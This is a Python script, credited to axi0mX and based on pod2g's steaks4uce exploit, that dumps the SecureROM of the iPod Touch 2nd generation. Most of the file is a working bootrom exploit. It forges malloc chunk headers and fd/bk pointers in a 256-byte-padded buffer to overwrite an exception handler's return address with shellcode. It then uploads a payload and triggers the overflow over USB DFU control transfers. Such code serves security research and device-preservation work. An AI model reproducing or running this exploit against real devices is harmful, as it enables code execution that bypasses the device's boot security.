#!/usr/bin/python
# S5L8720 - iPod Touch (2nd generation) - SecureROM dumper
# based on steaks4uce exploit by pod2g
# Author: axi0mX
# NOTE: This script is GPL3 licensed, based on https://github.com/axi0mX/s5l8720-securerom-dumper

import struct
import usb # pyusb: use 'pip install pyusb' to install this module
from dataclasses import dataclass
import time
from termcolor import colored

@dataclass
class DeviceConfig:
  version: str
  buffer_addr: int
  sha256: str

configs = [
  DeviceConfig('240.4',   0x22026340, '55f4d8ea2791ba51dd89934168f38f0fb21ce8762ff614c1e742407c0d3ca054'),
  DeviceConfig('240.5.1', 0x22026380, 'f15ae522dc9e645fcf997f6cec978ed3ce1811915e84938c68203fb95d80d300'),
]

CPID_STRING = 'CPID:8720'
SRTG_FORMAT = 'SRTG:[iBoot-%s]'

def create_exploit_buf():
  # Pad to length 256 and add heap data
  payload = bytes(256) + struct.pack('<14I',
                # freed buffer - malloc chunk header: (size 0x8)
          0x84, # 0x00: previous_chunk
           0x5, # 0x04: next_chunk
                # freed buffer - contents: (requested size 0x1C, allocated size 0x20)
          0x80, # 0x08: buffer[0] - direction
    0x22026280, # 0x0c: buffer[1] - usb_response_buffer
    0xFFFFFFFF, # 0x10: buffer[2]
         0x138, # 0x14: buffer[3] - size of payload in bytes
         0x100, # 0x18: buffer[4]
           0x0, # 0x1c: buffer[5]
           0x0, # 0x20: buffer[6]
           0x0, # 0x24: unused
                # next chunk - malloc chunk header: (size 0x8)
          0x15, # 0x28: previous_chunk
           0x2, # 0x2c: next_chunk
                # attack fd/bk pointers in this free malloc chunk for arbitrary write:
    0x22000001, # 0x30: fd: shellcode address (what to write)
    0x2202D7FC, # 0x34: bk: exception_irq() LR on the stack (where to write it)
  )

  return payload

def pwn():
  device = usb.core.find(idVendor=0x5AC, idProduct=0x1227)
  if device is None:
    print('ERROR: No Apple device in DFU Mode (0x1227) detected. Exiting.')
    exit(1)

  print('Found:', device.serial_number)
  if CPID_STRING not in device.serial_number:
    print('ERROR: This is not a compatible device. This tool is for S5L8720 devices only. Exiting.')
    exit(1)

  chosenConfig = None
  for config in configs:
    if SRTG_FORMAT % config.version in device.serial_number:
      chosenConfig = config
      break
  if chosenConfig is None:
    print('ERROR: CPID is compatible, but serial number string does not match.')
    print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
    exit(1)
  
  assert device.ctrl_transfer(0x21, 4, 0, 0, 0, 1000) == 0

  payload_bin = open("payload/payload.bin", "rb").read()
  CHUNK_SIZE = 0x800
  for i in range(0, len(payload_bin), CHUNK_SIZE):
    chunk = payload_bin[i:i+CHUNK_SIZE]
    print(f"[+] sending payload: 0x{i:x}-0x{i+len(chunk):x} of 0x{len(payload_bin):x}")
    assert device.ctrl_transfer(0x21, 1, 0, 0, chunk, 1000) == len(chunk)


  buf = create_exploit_buf()
  print("[+] sending exploit")
  assert device.ctrl_transfer(0x21, 1, 0, 0, buf, 1000) == len(buf)
  print("[+] triggering exploit")
  assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(buf), 1000)) == len(buf)

  time.sleep(0.1)

  buf = bytearray(64)
  # we seem to be fighting against something else trying to memset our buffer to 0, so
  # we read many times and OR the results together
  for _ in range(10):
    received = device.ctrl_transfer(0xA1, 1, 0, 0, 256, 1000).tobytes()
    assert len(received) == 256
    for i, x in enumerate(received[192:]):
      buf[i] |= x
  
  print("output:")
  print(buf.hex())

  usb.util.dispose_resources(device)

if __name__ == '__main__':
  pwn()
